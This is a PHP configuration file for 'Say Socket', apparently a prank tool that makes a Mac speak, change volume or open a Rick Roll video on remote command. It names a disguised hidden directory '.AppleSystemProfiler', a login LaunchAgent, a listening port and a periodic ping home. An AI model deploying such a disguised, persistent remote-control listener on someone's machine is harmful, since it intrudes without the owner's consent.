<?php

$protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' || $_SERVER['SERVER_PORT'] == 443) ? "https://" : "http://";

define('SERVER_HOST', $protocol . $_SERVER['HTTP_HOST'] . '/');
// define('SILENT_SUFFIX', '> /dev/null 2>&1 &');

// Use this for debugging (scripts will output to /tmp/ss.log)
define('SILENT_SUFFIX', '> /tmp/ss.log 2>&1 &');

define('DB_TABLE_PREFIX', 'ss_');
define('DB_TABLE_SIGNUP', DB_TABLE_PREFIX . 'signup');
define('DB_TABLE_STATUS', DB_TABLE_PREFIX . 'status');

// REGEX ICONS (content|href|src) * =|: *"/(apple|android|favicon|ms) -> $1="/icons/$2
global $ss_config, $b64_config;

$ss_config = array(
    'DIR_MAIN' => '.AppleSystemProfiler',
    'DIR_PING' => '/tmp/sbin',
    'DIR_BIN' => 'bin',
    'DIR_LAUNCH_AGENTS' => 'Library/LaunchAgents',
    'DIR_LOCAL_BIN' => '/usr/local/bin',

    'FILE_MAIN_BINARY' => 'ctl',
    'FILE_MAIN_MONITOR' => 'monitor',
    'FILE_MAIN_SCANNER' => 'scan',
    'FILE_PING_BINARY' => 'sys',
    'FILE_PING_MONITOR' => 'mon',
    'FILE_LAUNCH_PLIST' => 'com.user.loginscript',
    'FILE_PHP_BINARY' => '/usr/bin/php',
    'FILE_INSTALLER' => 'ss_install',
    'FILE_REMOVER' => 'ss_remove'
);

$b64_config = array(
    'CONST_REGEX_VALID_IP_ADDRESS' => '/^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$/',
    'CONST_REGEX_SIMPLE_STRING' => '/^[a-zA-Z0-9\s,\'\.]+$/',
    'CONST_REGEX_CTL_QUIT' => '/^quit|exit|shutdown$/i',
    'CONST_REGEX_CTL_RICK_ROLL' => '/^rickroll$/i',
    'CONST_REGEX_CTL_VOICES' => '/^voices$/i',
    'CONST_REGEX_CTL_GET_VOICE' => '/^voice$/i',
    'CONST_REGEX_CTL_SET_VOICE' => '/^voice ([a-z]+)$/i',
    'CONST_REGEX_CTL_VOLUME' => '/^volume (\d)$/i',
    'CONST_PORT_MIN' => 1024,
    'CONST_PORT_MAX' => 65535,
    'CONST_SS_PORT' => 12345,
    'CONST_PROMPT' => 'say> ',
    'CONST_PING_INTERVAL' => 10,

    'SS_CMD_QUIT' => 'quit|exit|shutdown',
    'SS_CMD_RICKROLL' => 'rickroll',
    'SS_CMD_VOICES' => 'voices',
    'SS_CMD_VOICE' => 'voice',
    'SS_CMD_VOLUME' => 'volume',

    'CMD_SAY' => 'say -v',
    'CMD_CURL_SILENT' => 'curl -s',
    'CMD_OPEN' => 'open',
    'CMD_OSASCRIPT' => 'osascript -e',
    'CMD_SET_VOLUME' => 'set Volume',
    'CMD_WHICH' => 'which',
    'CMD_IPCONFIG' => 'ipconfig',
    'CMD_GETIFADDR' => 'getifaddr',
    'CMD_PROCESSES' => 'ps aux',
    'CMD_NOHUP' => 'nohup',

    'OPT_IP' => 'ip',
    'OPT_PORT' => 'port',
    'OPT_HASH' => 'h',

    'STR_SERVER_HOST' => SERVER_HOST,
    'STR_DEFAULT_VOICE' => 'alex',
    'STR_PING_ARG' => 'ping',
    'STR_INTERFACE_PREFIX' => 'en',
    'STR_DEFAULT_IP' => '127.0.0.1',
    'STR_CURRENT_VOICE' => 'Current voice is:',
    'STR_VOICE_HELP' => "Voice does not exist. Use 'voices' command to see a list of available voices\n",
    'STR_CANNOT_SAY' => 'Cannot say:',
    'STR_COMMAND_EXISTS' => "command exists\n",
    'STR_TOO_COMPLEX' => "string is too complex\n",
    'STR_RICK_ROLL_URL' => 'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
    'STR_WELCOME_MSG' =>
        "\nWelcome to the Say Socket!\n" .
        "Type anything to say it through the socket.\n" .
        "To quit, type 'quit', 'exit', or 'shutdown'.\n",
);

require_once 'settings.inc';
require_once 'DatabaseConnection.inc';
require_once 'functions.inc';
